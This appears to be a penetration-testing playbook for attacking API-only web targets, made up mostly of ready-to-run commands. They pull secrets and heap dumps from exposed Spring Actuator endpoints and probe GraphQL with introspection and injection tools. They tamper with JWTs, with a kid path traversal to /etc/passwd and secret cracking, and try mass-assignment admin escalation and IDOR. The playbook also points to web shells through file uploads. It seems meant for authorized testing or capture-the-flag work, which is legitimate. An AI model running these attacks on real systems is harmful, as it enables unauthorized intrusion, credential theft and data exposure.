# Archetype: API-Only Target

**Match if you see:** JSON-only responses, Swagger/OpenAPI exposed, no HTML
UI, headers like `Content-Type: application/json` on `/`.

## Fast checks (≤ 5 min)

```bash
# 1) Find the spec
curl -s http://target/openapi.json
curl -s http://target/swagger.json
curl -s http://target/swagger/v1/swagger.json
curl -s http://target/api-docs
curl -s http://target/v2/api-docs                        # Swagger 2 default
curl -s http://target/v3/api-docs                        # OpenAPI 3 default
curl -s http://target/swagger/index.html
curl -s http://target/redoc

# 2) Common API roots
curl -s http://target/api
curl -s http://target/api/v1
curl -s http://target/api/v2
curl -s http://target/graphql                            # GraphQL?
curl -s http://target/graphiql

# 3) Health/info
curl -s http://target/actuator                           # Spring
curl -s http://target/actuator/env                       # Spring secrets
curl -s http://target/health
curl -s http://target/metrics
curl -s http://target/info
curl -s http://target/.well-known/

# 4) Verbs that get unusual responses
curl -s -X OPTIONS http://target/api -i
curl -s -X TRACE http://target/api -i
curl -s -X PATCH http://target/api/something -i
```

## Deep checks

### A. Spring Boot Actuator (CVE goldmine)
```bash
# If you find /actuator with no auth — you basically own the app
curl -s http://target/actuator/env                       # env vars (secrets)
curl -s http://target/actuator/heapdump > heap.hprof     # full heap dump
strings heap.hprof | grep -iE "(password|secret|token)"
curl -s http://target/actuator/loggers                   # can manipulate logging
curl -s http://target/actuator/beans
curl -s http://target/actuator/mappings                  # all routes
# Code execution via actuator/jolokia + httptrace + env (depending on version)
```

### B. GraphQL
```bash
# Introspection (often left on)
curl -X POST http://target/graphql -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name}}}}"}'

# Tools
clairvoyance http://target/graphql                       # schema even with introspection off
graphqlmap -u http://target/graphql                      # injection testing
inql -t http://target/graphql -o /tmp/inql                # full audit

# Common abuses:
# - Field-level auth missing (mutation that should be admin-only)
# - Resource exhaustion via deeply nested queries
# - SQLi in resolver args
```

### C. JWT
```bash
# If the API uses JWT (look at responses)
jwt_tool <token> -T                                      # tampering
jwt_tool <token> -X a -I -hc kid -hv "../../../etc/passwd"  # kid path traversal
jwt_tool <token> -C -d /usr/share/wordlists/jwt-secrets.txt # crack HMAC secret
```

### D. Mass assignment / IDOR
APIs are notorious for these:
```bash
# Try adding fields not in the docs
curl -X POST http://target/api/users -H "Content-Type: application/json" \
  -d '{"username":"new","password":"x","is_admin":true,"role":"admin"}'

# IDOR — substitute IDs
curl http://target/api/users/1
curl http://target/api/users/2
curl http://target/api/orders/1
```

### E. Source dive (especially for npm/python packages)
```bash
# The package.json or requirements.txt often appears in errors or in /api/info
# Once you have a framework name → source-dive
bash scripts/source-dive.sh <repo>
```

## Common pitfalls

1. **Only testing documented endpoints** — undocumented routes are where
   bugs live. Always run a routes scan against the source dive output.
2. **Skipping OPTIONS** — `OPTIONS` reveals allowed methods, often listing
   verbs (PATCH, DELETE) the docs hide.
3. **Treating GraphQL like REST** — it has its own attack surface; use GraphQL
   tools, not just curl + ffuf.
4. **Ignoring rate-limit response codes** — 429s mean *something* is auth'd
   even if the endpoint is "open". Worth a deeper look.

## Pivot targets

- Heap dumps (Spring) — full memory contents, including DB credentials
- Env endpoints — env vars verbatim
- Backup endpoints / `/api/admin/export` — full data dumps
- File upload endpoints with weak content-type validation → web shell
